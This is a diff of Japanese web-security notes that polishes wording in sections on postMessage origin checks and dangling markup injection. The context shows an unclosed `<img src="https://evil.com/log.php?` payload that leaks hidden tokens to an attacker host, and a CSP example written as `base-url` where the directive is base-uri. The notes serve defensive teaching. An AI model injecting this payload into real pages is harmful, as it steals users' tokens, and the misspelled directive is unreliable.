@@ -12,9 +12,9 @@ sandbox化されたiframeはユニークなオリジンが割り振られる。�
 
 ## オリジン間通信
 
-異なるオリジン感で通信をする際、[postMessage](https://developer.mozilla.org/ja/docs/Web/API/Window/postMessage)で実現可能。
+異なるオリジン間で通信をする際、[postMessage](https://developer.mozilla.org/ja/docs/Web/API/Window/postMessage)で実現可能。
 
-ただし、次のとおり何点かの注意事項がある。
+ただし、次のとおりいくつかの注意事項がある。
 
 ### postMessageの送信先（第二引数）は可能な限り指定する
 
@@ -26,7 +26,7 @@ sandbox化されたiframeはユニークなオリジンが割り振られる。�
 
 ### 受信側は送信元をチェックした上で処理する
 
-イベントリスナの`event.origin`で送信元をチェックする。
+イベントリスナに渡される`event.origin`で送信元をチェックする。
 
 ```js
 window.addEventListener("message", (event) => {
@@ -59,14 +59,14 @@ window.addEventListener("message", (event) => {
 
 ## Dangling markup injection
 
-次のような不正なHTMLタグをページに挿入することで、トークンなどを攻撃者に盗まれてしまう。
+攻撃者に次のような不正なHTMLタグをページに挿入されることで、トークンなどを盗まれてしまう。
 
 ```html
 <img src="https://evil.com/log.php?
 ```
 
 上記はimgタグおよび、src属性を閉じていない。そのため、ブラウザのパーサーは適切な終了シーケンスを探す。
-もし次のように、inputタグのhidden属性でトークンなどの重要な情報を指定していたら、`https://evil.com/log.php`に送信されてしまう。
+もし次のように、inputタグ（hidden属性）でトークンなどの重要な情報を指定していたら、`https://evil.com/log.php`に送信されてしまう。
 
 ```html
 <img src="https://evil.com/log.php?
@@ -77,7 +77,7 @@ window.addEventListener("message", (event) => {
 対処としては、次の2点。
 
 - 適切にエンコードし、HTMLインジェクション自体を防ぐ
-- CSPを使って、攻撃者のサーバーからページのリソースをロードを防ぐ
+- CSPを使って、攻撃者のサーバーからのリソースロードを防ぐ
 
   ```text
   Content-Security-Policy: img-src 'self'
@@ -90,7 +90,7 @@ window.addEventListener("message", (event) => {
 対処としては、次の2点。
 
 - 適切にエンコードし、HTMLインジェクション自体を防ぐ
-- CSPを使って、有効なベースURLを指定しておく
+- CSPを使って、有効なベースURLを限定しておく
 
   ```text
   Content-Security-Policy: base-url 'self'
